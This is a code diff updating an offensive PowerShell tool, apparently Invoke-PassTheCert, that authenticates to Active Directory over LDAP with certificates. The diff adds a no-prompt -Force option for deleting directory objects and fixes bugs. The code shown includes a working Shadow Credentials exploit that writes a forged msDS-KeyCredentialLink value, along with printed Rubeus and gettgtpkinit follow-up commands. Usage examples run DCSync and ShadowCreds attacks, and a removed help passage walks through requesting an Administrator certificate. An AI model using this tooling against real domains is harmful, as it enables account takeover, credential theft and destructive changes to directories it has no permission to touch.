@@ -30,7 +30,7 @@ function _ShowBanner {
     Write-Host -ForegroundColor Red     "   _| || | | \ V / (_) |   <  __/ |______| "
     Write-Host -ForegroundColor Red     "   \___/_| |_|\_/ \___/|_|\_\___|          "
     Write-Host -ForegroundColor Red     ""
-    Write-Host -ForegroundColor Red     "   v1.3.3 "
+    Write-Host -ForegroundColor Red     "   v1.3.4 "
     Write-Host -ForegroundColor Red     "  ______            _____ _          _____           _     "
     Write-Host -ForegroundColor Red     "  | ___ \          |_   _| |        /  __ \         | |    "
     Write-Host -ForegroundColor Red     "  | |_/ /___ ___ ___ | | | |__   ___| /  \/ ___ _ __| |_   "
@@ -6388,7 +6388,7 @@ function _Helper-ExportCertificateToFile {
             $SecureString = (ConvertTo-SecureString $ExportPassword -AsPlainText -Force)
         }
 
-    Write-Verbose "[*] Exporting The Certificate To The File '$ExportPath' Of Type '$ExportContentType', $PasswordString ..."
+    Write-Verbose "[*] Generating And Exporting Self-Signed Certificate To File '$ExportPath' Of Type '$ExportContentType', $PasswordString ..."
 
         switch ($ExportContentType) {
             "Unknown" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Unknown; break; } #??
@@ -6417,7 +6417,7 @@ function _Helper-ExportCertificateToFile {
         #    )
         #)
 
-        Write-Host "[+] Successfully Exported Certificate To File '$ExportPath' Of Type '$ExportContentType', $PasswordString"
+        Write-Host "[+] Successfully Generated And Exported Self-Signed Certificate To File '$ExportPath' Of Type '$ExportContentType', $PasswordString"
 
     } catch { Write-Host "[!] Exporting The Certificate To File '$ExportPath' Of Type '$ExportContentType' Failed With Error: $_" }
 
@@ -6986,7 +6986,7 @@ function _GetAttributeOfObject {
 
         .PARAMETER Raw
 
-            [Switch] 
+            [Switch]
             
             Whenever specified, returns the raw content of the attribute, i.e. without trying to convert it into human-readable format.
 
@@ -8332,6 +8332,12 @@ function _DeleteObject {
             
             The Distinguished Name of the object to delete.
 
+        .PARAMETER Force
+
+            [Switch]
+            
+            If specified, no confirmation prompt is displayed before deleting the object (Optional)
+
         .EXAMPLE
 
             $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
@@ -8343,6 +8349,12 @@ function _DeleteObject {
             _DeleteObject -LdapConnection $LdapConnection -ObjectDN 'CN=TSOL,OU=INTOTHEWILD,DC=X'
 
             Deletes the object `CN=TSOL,OU=INTOTHEWILD,DC=X`
+
+        .EXAMPLE
+
+            _DeleteObject -LdapConnection $LdapConnection -ObjectDN 'CN=TSOL,OU=INTOTHEWILD,DC=X' -Force
+
+            Deletes the object `CN=TSOL,OU=INTOTHEWILD,DC=X`, with no confirmation prompt.
 
         .LINK
 
@@ -8361,19 +8373,22 @@ function _DeleteObject {
         [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
 
         [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the distinguished name of the object to delete")]
-        [System.String]$ObjectDN
+        [System.String]$ObjectDN,
+
+        [Parameter(Position=2, Mandatory=$false, HelpMessage="Switch to force the deletion of the object (with no confirmation prompt).")]
+        [Switch]$Force
     )
     
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
 
-    if ((Read-Host "[!] Pending Deletion Of Object '$ObjectDN'. Continue? (Y/N)") -cne 'Y')  { 
-        return "[*] Gracefully Exiting..." 
+    if (-not $Force) {
+        if ((Read-Host "[!] Pending Deletion Of Object '$ObjectDN'. Continue? (Y/N)") -cne 'Y')  { 
+            return "[*] Gracefully Exiting..." 
+        }
+        if ((Read-Host "[!!] Sure?! (Last Warning...) (yY/N)") -cne 'yY')  { 
+            return "[*] Gracefully Exiting..."
+        }
     }
-    if ((Read-Host "[!!] Sure?! (Last Warning...) (YY/N)") -cne 'YY')  { 
-        return "[*] Gracefully Exiting..."
-    }
-
-    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
 
     Write-Verbose "[*] Deleting Object '$ObjectDN'..."
 
@@ -8384,7 +8399,7 @@ function _DeleteObject {
     ) |Out-Null
 
     Write-Host "[+] Successfully Deleted '$ObjectDN' Object !"
-    return
+
 }
 
 
@@ -10732,7 +10747,7 @@ function _LDAPEnum {
         }
 
         'LogonScripts' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(scriptPath=*)(msTSTnitialProgram=*))' |Select distinguishedName,scriptPath,msTSTnitialProgram,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(|(scriptPath=*)(msTSTnitialProgram=*))' |Select distinguishedName,scriptPath,msTSTnitialProgram,objectcategory
         }
 
         'CAs' {
@@ -10831,7 +10846,8 @@ function _LDAPEnum {
                         3 { $KeyCredential.RawKeyMaterial = $value; break; }
                         4 { 
                             if ($length -eq 1) { $KeyCredential.Usage = $value[0] } 
-                            else { $KeyCredential.LegacyUsage = [System.Text.Encoding]::UTF8.GetString($value); break; } 
+                            else { $KeyCredential.LegacyUsage = [System.Text.Encoding]::UTF8.GetString($value) }
+                            break; 
                         }
                         5 { $KeyCredential.Source = $value[0]; break; }
                         6 { $KeyCredential.DeviceId = [Guid]::New($value); break; }
@@ -11085,6 +11101,7 @@ function _LDAPExploit {
                 $NewSelfSignedCertificate = _Helper-GenerateSelfSignedCertificate -CN $sAMAccountName
                 _Helper-ExportCertificateToFile -Certificate $NewSelfSignedCertificate -ExportPath "$sAMAccountName.pfx"
                 
+
                 # 2.a. Initalize Variables
                 # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/KeyCredential.cs#L285
                 $RawKeyMaterial         = _Helper-ExportRSAPublicKeyBCrypt -Certificate $NewSelfSignedCertificate
@@ -11165,14 +11182,14 @@ function _LDAPExploit {
                 $blobWriter.Write([byte[]]$binaryProperties)
                 #Write-Verbose "binaryProperties $($binaryProperties.Length) blobWriter length so far: $($blobStream.Length)"
 
-                $binaryKeyCredential = $blobStream.ToArray()
-
 
                 # 4. Convert into DN With Binary String
                 # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/KeyCredential.cs#L512-L516
+                $binaryKeyCredential = $blobStream.ToArray()
                 $Hex = ($binaryKeyCredential | ForEach-Object { '{0:X2}' -f $_ }) -join ''
                 $DNWithBinary = "B:$($Hex.Length):$($Hex):$TargetDN"
                 
+
                 # 5. Populate !
                 _AddValueInAttribute -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'msDS-KeyCredentialLink' -Value $DNWithBinary
 
@@ -11180,7 +11197,6 @@ function _LDAPExploit {
                 Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'ShadowCreds'"
                 Write-Host "[*$Exploit*] [Exploit] gettgtpkinit.py -dc-ip <dc_ip> -cert-pfx '$sAMAccountName.pfx' -pfx-pass '' $(_Helper-GetDomainNameFromDN -DN $TargetDN)/'$sAMAccountName' './out.ccache'"
                 Write-Host "[*$Exploit*] [Exploit] Rubeus.exe asktgt /dc:<dc_ip> /domain:$(_Helper-GetDomainNameFromDN -DN $TargetDN) /user:'$sAMAccountName' /certificate:'$sAMAccountName.pfx' /password:'' /nowrap"
-
 
             } catch { 
 
@@ -11449,7 +11465,7 @@ function Invoke-PassTheCert-GetLDAPConnectionInstance {
         
         [Parameter(Position=4, Mandatory=$false, HelpMessage="Don't show the banner whenever set :(")]
         [PSDefaultValue(Help="Show the banner")]
-        [switch]$NoBanner = $false
+        [Switch]$NoBanner = $false
     )
 
     if (-not $NoBanner) {  _ShowBanner; }
@@ -11589,7 +11605,7 @@ function Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile {
 
         [Parameter(Position=4, Mandatory=$false, HelpMessage="Don't show the banner whenever set :(")]
         [PSDefaultValue(Help="Show the banner")]
-        [switch]$NoBanner = $false
+        [Switch]$NoBanner = $false
     )
 
     if (-not $NoBanner) {  _ShowBanner; }
@@ -11614,58 +11630,7 @@ function Invoke-PassTheCert {
 
             [0] Grab a certificate using your favorite tool:
                 
-                From Linux:
-
-                    $ sudo apt install -y certipy-ad
-                    $ certipy-ad find -u '<user>@<domain>' -p '<password>' -enabled -stdout [-ns <dns_ip>] [-dc-ip <dc_ip>]
-                    $ certipy-ad req -u '<user>@<domain>' -p '<password>' -target '<dc_fqdn>' -ca '<ca_name>' -template 'User' [-ns <dns_ip>] [-dc-ip <dc_ip>] [-dc-host '<dc_host>']
-
-
-                From Windows (https://github.com/GhostPack/Certify/issues/13):
-
-                    Note: 
-                    - The below steps are based on the provided `Administrator.inf` file. Here, we want a `User` certificate template as the `Administrator` user in the domain `ADLAB.LOCAL`.
-                    - No need to run mmc.exe if you already trust the CA's certificate. Hence, you may skip to the `certreq` commands.
-                    - If the DC's network interface has the `File and Printer Sharing for Microsoft Networks` item unchecked, the MMC won't be able to connect to the domain, erroring-out `The domain X could not be found because: The RPC server is unavailable`.
-
-                    PS > runas /netonly /user:ADLAB.LOCAL\Administrator powershell.exe
-
-                    PS (runas) > mmc.exe /server:<dc_ip>
-                    GUI > CTRL+M (i.e. `File > Add/Remove Snap-in) > Certificates > Computer Account > Another computer > DC02 > Check Names`
-                    GUI > Certificates (\\DC02) > \\DC02\Personal > Find Certificates...
-                        Find in: \\DC02\Personal
-                        Contains: -
-                        ADLAB-DC02-CA > Export > DER encoded binary X.509 (.CER)
-                        ADLAB-DC02-CA.cer > Install Certificate... > Current User & Local Machine > Automatically select the certificate store based on the type of certificate
-
-                    PS (runas) > certreq -f -v -new Administrator.inf Administrator.req
-                        [...]
-                        Template not found.  Do you wish to continue anyway?
-                        User
-                        CERT_DIGITAL_SIGNATURE_KEY_USAGE: 80 -> 80
-                        CERT_KEY_ENCIPHERMENT_KEY_USAGE: 20 -> a0
-                        PKCS10: 1 -> 1
-                        CertReq: Request Created
-
-                    PS (runas) > certreq -f -v -submit -config "192.168.56.202\ADLAB-DC02-CA" Administrator.req Administrator.cer
-                        [...]
-                        RequestId: 20
-                        RequestId: "20"
-                        Certificate retrieved(Issued) Issued  0x80094004, The Enrollee (CN=Administrator,CN=Users,DC=ADLAB,DC=LOCAL) has no E-Mail name registered in the Active Directory.  The E-Mail name will not be included in the certificate.
-
-                    PS (runas) > certreq -f -accept -user -config "192.168.56.202\ADLAB-DC02-CA" Administrator.rsp
-                        Installed Certificate:
-                        Serial Number: 4d00000017a8fe1345f16fc666000000000017
-                        Subject: CN=Administrator, CN=Users, DC=X (Other Name:Principal Name=Administrator@ADLAB.LOCAL)
-                        NotBefore: <DATE>
-                        NotAfter: <DATE>
-                        Thumbprint: 7346002CB3068527826DACEBEC9A5A62B71FE685
-
-                    PS > Get-ChildItem Cert:\CurrentUser\My | Where-Object { $_.HasPrivateKey }
-                        [...]
-                        7346002CB3068527826DACEBEC9A5A62B71FE685  CN=Administrator, CN=Users, DC=ADLAB, DC=LOCAL
-
-                    PS > Export-PfxCertificate -Cert (Get-ChildItem Cert:\CurrentUser\My\7346002CB3068527826DACEBEC9A5A62B71FE685) -FilePath 'Administrator.pfx' -Password (New-Object System.Security.SecureString)
+                (See README.md)
 
 
             [1] Import the script into your current PowerShell session:
@@ -11676,11 +11641,6 @@ function Invoke-PassTheCert {
             [2] Grab an LDAP Connection Instance, authenticating to an LDAP/S Server using a passwordless/password-protected certificate:
 
                 PS > $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-                - You MAY export that LDAP Connection Instance into a passwordless/password-protected certificate; for instance:
-                    PS > Get-Help Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -Full
-                    PS > Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.pfx' -ExportContentType 'pfx'
-                    PS > Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.p12' -ExportContentType 'pkcs12' -ExportPassword 'ExP0rTP@sssw0Rd123!'
 
 
             [3] List all the available Actions:
@@ -11700,13 +11660,13 @@ function Invoke-PassTheCert {
                 PS > $DumpLdap = Invoke-PassTheCert -Action 'Filter' -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties * -LDAPFilter '(objectClass=*)'
                 PS > $DumpLdap |?{$_.sAMAccountName -ne $null -and ($_.useraccountcontrol -like '*WORKSTATION_TRUST_ACCOUNT*' -or $_.useraccountcontrol -like '*NORMAL_ACCOUNT*')} |Select-Object sAMAccountName,description,useraccountcontrol,distinguishedname,serviceprincipalname |fl
                 
-                PS > $DumpInboundACLsWrite = Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection $LdapConnection -Object 'CN=Kinda KU. USY,CN=Users,DC=X'
-                PS > $DumpInboundACLsWrite |?{ $_.AceQualifier -eq 'AccessAllowed' -and ($_.AccessMaskNames -ilike '*GenericAll*' -or $_.AccessMaskNames -ilike '*GenericWrite*' -or $_.AccessMaskNames -ilike '*WriteProperty*' -or $_.AccessMaskNames -ilike '*WriteDACL*') -and $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}\d{3,}' }
+                PS > $DumpInboundACLs = Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection $LdapConnection -Object 'CN=Kinda KU. USY,CN=Users,DC=X'
+                PS > $DumpInboundACLs |?{ $_.AceQualifier -eq 'AccessAllowed' -and ($_.AccessMaskNames -ilike '*GenericAll*' -or $_.AccessMaskNames -ilike '*GenericWrite*' -or $_.AccessMaskNames -ilike '*WriteProperty*' -or $_.AccessMaskNames -ilike '*WriteDACL*') -and ($_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}\d{4,}' -or $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}513' -or $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}515' -or $_.SecurityIdentifier -in @('S-1-1-0', 'S-1-5-11', 'S-1-5-15', 'S-1-5-7', 'S-1-5-32-545', 'S-1-5-32-546')) }
 
                 PS > Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'DCSync'
 
                 PS > Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'DCSync' -Identity 'CN=John JD. DOE,CN=Users,DC=X' -Target 'DC=X'
-                PS > Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'DCSync' -Identity 'jdoe' -IdentityDomain 'X' -Target 'DC=X'
+                PS > Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'ShadowCreds' -Target 'jdoe' -TargetDomain 'X' -Verbose
 
         .PARAMETER Action
 
@@ -11716,7 +11676,7 @@ function Invoke-PassTheCert {
 
         .PARAMETER Help, h
 
-            [Switch] 
+            [Switch]
             
             Enables the Get-Help display for the specified Action.
 
@@ -11919,20 +11879,20 @@ function Invoke-PassTheCert {
         [Parameter(Position=23, Mandatory=$false, HelpMessage="Whenever Set, shows the Detailed Get-Help for the specified action")]
         [Alias('h')]
         [Alias('hd')]
-        [switch]$HelpDetailed,
+        [Switch]$HelpDetailed,
 
         [Parameter(Position=24, Mandatory=$false, HelpMessage="Whenever Set, shows the Examples Get-Help for the specified action")]
         [Alias('he')]
-        [switch]$HelpExamples,
+        [Switch]$HelpExamples,
 
         [Parameter(Position=25, Mandatory=$false, HelpMessage="Whenever Set, shows the Full Get-Help for the specified action")]
         [Alias('hf')]
         [Alias('hh')]
-        [switch]$HelpFull,
+        [Switch]$HelpFull,
 
         [Parameter(Position=26, Mandatory=$false, HelpMessage="Whenever Set, shows the list of available actions")]
         [Alias('a')]
-        [switch]$ListActions,
+        [Switch]$ListActions,
 
         [Parameter(Position=27, Mandatory=$false, HelpMessage="Enter the path of the certificate to export")]
         [System.String]$ExportPath,
@@ -11981,10 +11941,13 @@ function Invoke-PassTheCert {
 
         [Parameter(Position=41, Mandatory=$false, HelpMessage="Enter the Domain Of The '-Object' Parameter (REQUIRED if the '-Object' parameter is NOT a distinguished name)")]
         [System.String]$ObjectDomain,
+
+        [Parameter(Position=42, Mandatory=$false, HelpMessage="Switch to force an action (without confirmation prompt).")]
+        [Switch]$Force,
         
         [Parameter(Position=1337, Mandatory=$false, HelpMessage="Set to true to hide the banner :(")]
         [PSDefaultValue(Help="Defaults to showing the banner")]
-        [switch]$NoBanner = $false,
+        [Switch]$NoBanner = $false,
 
         # =========================================
         # =====      LD4P3num'Th3m'411!       =====
@@ -12032,7 +11995,7 @@ function Invoke-PassTheCert {
     try {
 
         # Manually handle the switch/alias to show helps.
-        if ($ListActions -eq $true) {
+        if ($ListActions) {
             Write-Host ""
             Write-Host "[*] Available Actions Are:"
             Write-Host "$((Get-Command Invoke-PassTheCert).Parameters['Action'].Attributes |?{ $_.TypeId.Name -eq "ValidateSetAttribute" } |Select-Object -ExpandProperty ValidValues | %{
@@ -12100,7 +12063,7 @@ function Invoke-PassTheCert {
                 else { $Result = _CreateObject -LdapConnection $LdapConnection -ObjectDN $ObjectDN -ObjectType $ObjectType -sAMAccountName $sAMAccountName -UACFlags $UACFlags -NewPassword $NewPassword; }
             }
             "DeleteObject" {
-                $Result = _DeleteObject -LdapConnection $LdapConnection -ObjectDN $ObjectDN;
+                $Result = _DeleteObject -LdapConnection $LdapConnection -ObjectDN $ObjectDN $Force;
             }
             "GetInboundACEs" {
                 $Result = _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN $ObjectDN;
@@ -12203,7 +12166,7 @@ function Invoke-PassTheCert {
 
 [Parameter(Position=0, Mandatory=$false, HelpMessage="Don't show the banner whenever set :(")]
 [PSDefaultValue(Help="Show the banner")]
-[switch]$NoBanner = $false
+[Switch]$NoBanner = $false
 
 Write-Host ""
 
